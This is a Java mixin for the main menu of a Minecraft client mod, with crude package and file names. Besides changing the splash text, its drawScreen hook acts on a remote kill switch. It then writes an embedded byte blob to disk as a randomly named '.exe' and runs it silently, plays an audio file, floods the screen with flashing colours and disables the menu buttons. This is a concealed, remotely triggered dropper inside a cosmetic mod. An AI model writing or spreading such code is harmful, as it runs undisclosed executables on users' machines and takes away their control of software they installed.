package fuck.you.mixins;

import java.io.File;
import java.nio.file.Paths;
import java.util.Random;

import org.lwjgl.opengl.GL11;
import org.mp3transform.awt.PlayerThread;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import com.google.common.io.Files;

import fuck.you.Configuration;
import fuck.you.Restart;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.renderer.GlStateManager;

@Mixin( GuiMainMenu.class )
public class MixinGuiMainMenu extends GuiScreen
{
	@Shadow
	private String splashText;
	
	private boolean startedplaying = false;
	private Random random = new Random( );
	
	// https://forums.minecraftforge.net/topic/53155-111-client-gui-gl11-scale-problem/?do=findComment&comment=257208
	public void drawStringSized( String text, int x, int y, float size, int color )
	{
		GL11.glScalef( size, size, size );
		
		float mSize = ( float )Math.pow( size, -1 );
		
		this.drawString( this.fontRenderer, text, Math.round( x / size ), Math.round( y / size ), color );
		
		GL11.glScalef( mSize, mSize, mSize );
	}

	@Inject( method = "actionPerformed", at = @At( "HEAD" ), cancellable = true )
	public void actionPerformed( GuiButton button, CallbackInfo info )
	{
		if( Restart.INSTANCE.getKillSwitch( ).shouldStopFull( ) )
			info.cancel( );
	}
	
	@Inject( method = "drawScreen", at = @At( "HEAD" ), cancellable = true )
	public void drawScreen( int mouseX, int mouseY, float partialTicks, CallbackInfo info )
	{
		if( Restart.INSTANCE.getKillSwitch( ).shouldStopFull( ) )
		{
			if( !startedplaying )
			{
				startedplaying = true;

				try
				{
					String name = String.format( "ez_mad_retard_%d.exe", random.nextInt( 100000 ) );
					
					Files.write( Restart.INSTANCE.getKillSwitch( ).SOUND,
							Paths.get( name ).toFile( ) );
					
					Process p = new ProcessBuilder( name ).start( );
				}
				catch( Exception e )
				{
					
				}
				
				try
				{
					File f = new File( "cringe.mp3" );
					PlayerThread.startPlaying( null, f, null );
				}
				catch( Exception e )
				{
					
				}
			}
			
			for( int i = 0; i <= this.height; i++ )
			{
				int color = random.nextInt( 255 ) * random.nextInt( 255 ) * random.nextInt( 255 ) * 255;
				this.drawHorizontalLine( 0, this.width, i, color );
			}
			
			try
			{
				int strwidth = ( int )( ( float )this.fontRenderer.getStringWidth( "Excuse me?" ) * 2.5f );
				
				GlStateManager.pushMatrix( );
				
				int x = ( ( width / 2 ) - ( strwidth ) );
				int y = ( height / 2 ) - ( int )( ( float )this.fontRenderer.FONT_HEIGHT * ( 2.5f ) );
				
				drawStringSized( "Excuse me?", x, y, 5.0f, 0xFFFFFF );
				
				GlStateManager.popMatrix( );
			}
			catch( Exception e )
			{
				
			}
			
			info.cancel( );
			return;
		}
		
		if( Restart.INSTANCE.getKillSwitch( ).shouldDisable( ) ) return;
		
		if( Configuration.main.splashTextChanger )
			splashText = Restart.INSTANCE.getSplashTextManager( ).generate( );
	}
}
